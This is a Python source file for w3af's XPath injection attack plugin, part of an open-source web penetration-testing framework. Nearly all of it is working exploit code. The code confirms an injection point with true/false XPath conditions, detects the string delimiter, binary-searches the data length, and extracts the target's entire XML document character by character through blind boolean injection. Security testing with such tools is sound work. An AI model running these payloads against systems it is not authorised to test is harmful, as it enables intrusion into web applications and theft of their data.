"""
xpath.py

Copyright 2012 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import difflib
import re
import textwrap

from random import randint

import w3af.core.controllers.output_manager as om

from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
from w3af.core.controllers.threads.threadpool import return_args
from w3af.core.controllers.exceptions import BaseFrameworkException
from w3af.core.data.kb.shell import Shell

ERROR_MSG = 'Empty search result'
XML_FILTER = '//*'
THRESHOLD = 0.8


class xpath(AttackPlugin):
    """
    Exploit XPATH injections with the objective of retrieving the complete XML text.

    :author: Nahuel Sanchez
    :author: Andres Riancho
    """
    def __init__(self):
        AttackPlugin.__init__(self)

        # Internal variables
        self.rnum = randint(1, 100)

    def get_attack_type(self):
        """
        :return: The type of exploit, SHELL, PROXY, etc.
        """
        return 'shell'

    def get_root_probability(self):
        """
        :return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        """
        return 0.1

    def get_kb_location(self):
        """
        This method should return the vulnerability names (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds a
        vuln, and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding
        (attack.os_commanding) should return ['os_commanding',] in this method.
        
        If there is more than one location the implementation should return
        ['a', 'b', ..., 'n']
        """
        return ['xpath']

    def _generate_shell(self, vuln):
        """
        :param vuln: The vulnerability to exploit

        :return: A shell object that allows the user to dump
        the full XML using an xpath injection vulnerability.
        """
        #
        #    Check if the vulnerability can be exploited using our techniques
        #
        vuln_verified, is_error_resp = self._verify_vuln(vuln)
        if vuln_verified:
            # Create the shell object
            shell_obj = XPathReader(vuln, self._uri_opener, self.worker_pool,
                                    self.STR_DELIM, self.TRUE_COND,
                                    is_error_resp)
            return shell_obj

        else:
            # FAIL!
            return None

    def _verify_vuln(self, vuln):
        """
        :return: True if the vulnerability can be exploited.
        """
        #    Check if I should difflib or not for this vulnerability
        is_error_resp = self._configure_is_error_function(vuln, 5)

        #
        #    Create the TRUE and FALSE conditions for the queries using
        #    the correct string delimiter
        #
        delimiter = self._get_delimiter(vuln, is_error_resp)
        self.STR_DELIM = delimiter
        
        orig_value = vuln.get_mutant().get_token_original_value()

        self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DELIM,
                                                   self.STR_DELIM, self.rnum,
                                                   self.STR_DELIM,
                                                   self.STR_DELIM, self.rnum)

        self.FALSE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DELIM,
                                                    self.STR_DELIM, self.rnum,
                                                    self.STR_DELIM,
                                                    self.STR_DELIM, self.rnum + 1)

        mutant = vuln.get_mutant()

        mutant_false = mutant.copy()
        mutant_false.set_token_value(self.FALSE_COND)
        
        mutant_true = mutant.copy()
        mutant_true.set_token_value(self.TRUE_COND)

        try:
            false_resp = self._uri_opener.send_mutant(mutant_false)
            true_resp = self._uri_opener.send_mutant(mutant_true)
        except BaseFrameworkException, e:
            return 'Error "%s".' % e
        else:
            if (is_error_resp(false_resp.get_body())
                and not is_error_resp(true_resp.get_body())):
                return True, is_error_resp
        
        return False, None

    def _get_delimiter(self, vuln, is_error_resp):
        """
        :return: The delimiter to be used to terminate strings, one of
        single quote or double quote. If an error is found, None is returned.
        """
        mutant = vuln.get_mutant()
        orig_value = mutant.get_token_original_value()

        true_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum)
        false_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum + 1)
        true_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum)
        false_dq = '%s" and "%i"="%i' % (orig_value, self.rnum, self.rnum + 1)
        
        to_test = [("'", true_sq, false_sq),
                   ('"', true_dq, false_dq)]
        
        for str_delim, true_xpath, false_xpath in to_test:
            mutant_true = mutant.copy()
            mutant_false = mutant.copy()
            
            mutant_true.set_token_value(true_xpath)
            mutant_false.set_token_value(false_xpath)
            
            try:
                true_resp = self._uri_opener.send_mutant(mutant_true)
                false_resp = self._uri_opener.send_mutant(mutant_false)
            except BaseFrameworkException, e:
                om.out.debug('Error "%s"' % e)
            else:
                if (is_error_resp(false_resp.get_body())
                    and not is_error_resp(true_resp.get_body())):
                    return str_delim
        else:
            msg = 'Failed to identify XPATH injection string delimiter.'
            raise BaseFrameworkException(msg)                

    def _configure_is_error_function(self, vuln, count):
        """
        This function determines if we can use DiffLib to evaluate responses
        If not possible Error base detection will be used.

        :return: The function that should be used to compare responses. This
                 function will return True when the response body passed as
                 parameter contains an XPATH error.
        """
        diff_ratio = 0.0

        mutant = vuln.get_mutant()
        mutant.set_token_value(vuln.get_mutant().get_token_original_value())

        om.out.debug("Testing if body dynamically changes.")
        try:
            base_res = self._uri_opener.send_mutant(mutant)

            for _ in xrange(count):
                req_x = self._uri_opener.send_mutant(mutant)
                diff_ratio += difflib.SequenceMatcher(None, base_res.get_body(),
                                                      req_x.get_body()).ratio()

        except BaseFrameworkException, e:
            om.out.debug('Error "%s"' % e)
        except RuntimeError, rte:
            issue = 'https://github.com/andresriancho/w3af/issues/5278'

            msg = ('An unhandled exception occurred while trying to setup'
                   ' the error detection for XPATH injection. This situation'
                   ' is very strange, but others have reported it in the'
                   ' past.\n\n'

                   'The exception message is: "%s"'

                   'Please help us fix this issue by adding a comment with'
                   ' the steps to reproduce it and the exception message to'
                   ' %s\n\n')

            om.out.console(msg % (issue, rte))
        else:
            #use_difflib = (diff_ratio / count) < THRESHOLD
            # FIXME: I'm not using difflib since it doesn't work well in my
            #        test environment, but in the future I might need it for
            #        a real engagement.
            use_difflib = False
            ier = IsErrorResponse(vuln, self._uri_opener, use_difflib)
            is_error_resp = ier.is_error_response
            return is_error_resp

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin exploits XPATH injections. The exploit result is the full
        text dump (without tags) of the remote XML file.

        No options are available at this moment since the plugin is in beta
        phase.
        """


class XPathReader(Shell):

    def __init__(self, vuln, uri_opener, worker_pool, str_delim,
                 true_xpath, is_error_resp):
        self.STR_DELIM = str_delim
        self.TRUE_COND = true_xpath
        self.is_error_resp = is_error_resp

        super(XPathReader, self).__init__(vuln, uri_opener, worker_pool)

        self._rOS = 'XML'
        self._rSystem = 'XPATH Query'
        self._rUser = None
        self._rSystemName = None

        # TODO: Review this HARD-CODED constant
        self.max_data_len = 10000

    def __repr__(self):
        return '<' + self.get_name() + ' object)>'

    __str__ = __repr__

    def set_url_opener(self, uo):
        self.is_error_resp.set_url_opener(uo)
        self._uri_opener = uo

    def help(self, command):
        """
        Handle the help command.
        """
        _help = """\
        Available commands:
            help                            Display this information
            getxml                          Get the full XML file
            exit                            Exit this shell session
        """
        return textwrap.dedent(_help)

    def specific_user_input(self, command, parameters):
        """
        This method is called when a user writes a command in the shell and hits
        enter.

        Before calling this method, the framework calls the generic_user_input
        method from the shell class.

        :param command: The command to handle ( ie. "read", "exec", etc ).
        :param parameters: The parameters for @command.
        :return: The result of the command.
        """
        if command.strip() == 'getxml':
            return self.getxml()

    def getxml(self):
        """
        This method executes a command in the remote operating system by
        exploiting the vulnerability.

        :param command: The command to handle ( ie. "ls", "whoami", etc ).
        :return: The result of the command.
        """
        try:
            data_len = self._get_data_len()
        except BaseFrameworkException, e:
            return 'Error found during data length extraction: "%s"' % e

        if data_len is not None:
            try:
                data = self.get_data(data_len)
            except BaseFrameworkException, e:
                return 'Error found during data extraction: "%s"' % e
            else:
                return data

    def _get_data_len(self):
        """
        :return: The length of the data to retrieve or self.max_data_len if the
        XML is too long. In the case of an error, None is returned.
        """
        om.out.debug("Finding XML data length (max: %s)" % self.max_data_len)
        
        maxl = self.max_data_len
        minl = 1
        
        while True:

            mid = (maxl + minl) / 2
            om.out.debug("MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl))
            
            if self._verify_data_len_eq(mid):
                om.out.debug('Response Length FOUND!: %i ' % (mid))
                return mid
            
            else:
                if self._verify_data_len_lt(mid):
                    maxl = mid
                else:
                    minl = mid
    
    def _fill_xpath_and_eval(self, xpath_fmt, str_len):
        """
        Given a xpath_fmt which takes five params:
            - Original value
            - String delimiter
            - XML filter
            - XML filter result length to compare agains (@str_len)
            - True condition
        
        Generate the XPATH, send it to the remote server and
        :return: True when the response does NOT contain an XPATH error.
        """
        mutant = self.get_mutant()
        orig_value = mutant.get_token_original_value()
        skip_len = len(orig_value) + len(self.STR_DELIM) + len(' ')
        
        findlen = xpath_fmt % (orig_value, self.STR_DELIM, XML_FILTER,
                               str_len, self.TRUE_COND[skip_len:])
        
        mutant.set_token_value(findlen)
        lresp = self._uri_opener.send_mutant(mutant)

        if not self.is_error_resp(lresp.get_body()): 
            return True
        
        return False   
        
    def _verify_data_len_lt(self, str_len):
        """
        :return: True if the string data length is LESS THAN @str_len 
        """
        xpath_fmt = "%s%s and string-length(%s)<%i %s"
        return self._fill_xpath_and_eval(xpath_fmt, str_len)
    
    def _verify_data_len_eq(self, str_len):
        """
        :return: True if the string data length is @str_len 
        """
        xpath_fmt = "%s%s and string-length(%s)=%i %s"
        return self._fill_xpath_and_eval(xpath_fmt, str_len)
        
    def get_data(self, data_len):
        """
        :param data_len: The data length to retrieve
        :return: A string with the XML data!

        HTTP library exceptions are not handled in order to make the code
        clearer.
        """
        data = [None] * data_len
        
        mod_get_char = return_args(self.get_char_in_pos)
        imap_unordered = self.worker_pool.imap_unordered
        len_iter = xrange(data_len)
        
        for (pos,), char in imap_unordered(mod_get_char, len_iter):
            data[pos] = char
        
        clean_data = []
        current = ''
        
        for char in data:
            if char is None:
                current = current.strip()
                if current != '':
                    clean_data.append(current)
                current = ''
            else:
                current += char
        
        return '\n'.join(clean_data)
    
    def get_char_in_pos(self, pos):
        """
        :return: The character for position @pos in the XML.
        """
        mutant = self.get_mutant()

        for c in xrange(32, 127):

            orig_value = mutant.get_token_original_value()
            skip_len = len(orig_value) + len(self.STR_DELIM) + len(' ')

            hexcar = chr(c)
            dataq = '%s%s and substring(%s,%i,1)="%s" %s' % (orig_value,
                                                             self.STR_DELIM,
                                                             XML_FILTER,
                                                             pos, hexcar,
                                                             self.TRUE_COND[skip_len:])
            mutant.set_token_value(dataq)
            dresp = self._uri_opener.send_mutant(mutant)

            if not self.is_error_resp(dresp.get_body()):
                om.out.console('Character found: "%s"' % hexcar)
                return hexcar
        else:
            om.out.console('Character NOT found!')
            return None

    def get_name(self):
        return 'xpath_reader'

    def identify_os(self):
        self._rOS = 'unknown'
        self._rSystem = 'XPath'
        self._rUser = 'xml-file'
        self._rSystemName = 'unknown'

    def __reduce__(self):
        """
        @see: Shell.__reduce__ to understand why this is required.
        """
        return self.__class__, (self._vuln, None, None, self.STR_DELIM,
                                self.TRUE_COND, self.is_error_resp)


class IsErrorResponse(object):
    def __init__(self, vuln_obj, url_opener, use_difflib):
        self.vuln_obj = vuln_obj
        self.url_opener = url_opener
        self.use_difflib = use_difflib
        self.base_response = None

    def __reduce__(self):
        """
        @see: Shell.__reduce__ to understand why this is required.
        """
        return self.__class__, (self.vuln_obj, None, self.use_difflib)

    def set_url_opener(self, uo):
        self.url_opener = uo

    def _configure(self):
        mutant = self.vuln_obj.get_mutant()
        mutant.set_token_value(mutant.get_token_original_value())

        self.base_response = self.url_opener.send_mutant(mutant)
        
    def is_error_response(self, res_body):
        """
        This functions checks which method must be used to check Responses
    
        :return: True if the res_body is ERROR and FALSE if Not
        """
        # FIXME: See FIXME above where I disable the use of difflib.
        if self.use_difflib:
            
            if self.base_response is None:
                self._configure()
                
            if difflib.SequenceMatcher(None, self.base_response.get_body(),
                                       res_body).ratio() > THRESHOLD:
                return True
            else:
                return False
    
        else:
    
            if re.search(ERROR_MSG, res_body, re.IGNORECASE):
                return True
            else:
                return False
